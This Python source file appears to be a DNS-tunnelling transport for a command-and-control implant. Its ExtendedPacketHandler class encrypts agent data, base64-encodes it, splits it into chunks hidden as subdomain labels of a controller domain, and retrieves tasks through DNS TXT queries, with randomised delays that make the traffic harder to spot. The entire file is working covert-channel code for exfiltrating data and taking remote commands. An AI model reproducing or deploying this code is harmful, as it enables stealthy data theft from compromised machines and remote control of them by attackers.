import base64
import random
import sys
import os
import struct
import socket
import time

class ExtendedPacketHandler(PacketHandler):
    def __init__(self, agent, staging_key, session_id, headers, server, taskURIs, key=None):
        super().__init__(agent=agent, staging_key=staging_key, session_id=session_id, key=key)
        self.headers = headers
        self.taskURIs = taskURIs
        self.server = server
        self.ns = "8.8.8.8"
        if os.name == "posix":
            try:
                with open("/etc/resolv.conf", "r") as f:
                    for line in f:
                        if "nameserver" in line:
                            self.ns = line.split()[1].strip()
                            break
            except Exception:
                pass

    def _query(self, domain, qtype=16):
        tid = random.randint(1000, 65535)
        p = struct.pack(">HHHHHH", tid, 256, 1, 0, 0, 0)
        for part in domain.split('.'):
            p += struct.pack("B", len(part)) + part.encode()
        p += b'\x00' + struct.pack(">HH", qtype, 1)
        
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.settimeout(2.0)
        try:
            sock.sendto(p, (self.ns, 53))
            resp, _ = sock.recvfrom(4096)
            if qtype == 16 and len(resp) > len(p):
                ans_len = struct.unpack(">H", resp[len(p)+10:len(p)+12])[0]
                if ans_len > 0:
                    txt_len = resp[len(p)+12]
                    return resp[len(p)+13:len(p)+13+txt_len]
        except Exception:
            pass
        finally:
            sock.close()
        return None

    def send_message(self, packets=None):
        if packets:
            enc_data = aes_encrypt_then_hmac(self.key, packets)
            routingPacket = self.build_routing_packet(self.staging_key, self.session_id, meta=5, enc_data=enc_data)
            b64 = base64.urlsafe_b64encode(routingPacket).decode('utf-8').replace('=','')
            
            chunk_size = 60
            chunks = [b64[i:i+chunk_size] for i in range(0, len(b64), chunk_size)]
            tid = random.randint(1000, 9999)
            
            for idx, chunk in enumerate(chunks):
                q = f"r{tid}c{idx}t{len(chunks)}.{chunk}.{self.server}"
                self._query(q, 1)
                time.sleep(random.uniform(0.05, 0.2))
            
            return ('200', b'')

        else:
            routingPacket = self.build_routing_packet(self.staging_key, self.session_id, meta=4)
            b64 = base64.urlsafe_b64encode(routingPacket).decode('utf-8').replace('=','')
            tid = random.randint(1000, 9999)
            
            resp = self._query(f"r{tid}c0t1.{b64}.{self.server}", 16)
            if resp:
                # pad base64 correctly
                resp = resp.replace(b"-", b"+").replace(b"_", b"/")
                pad = len(resp) % 4
                if pad:
                    resp += b"=" * (4 - pad)
                return ('200', base64.b64decode(resp))
            
            self.missedCheckins += 1
            return ('404', b'')
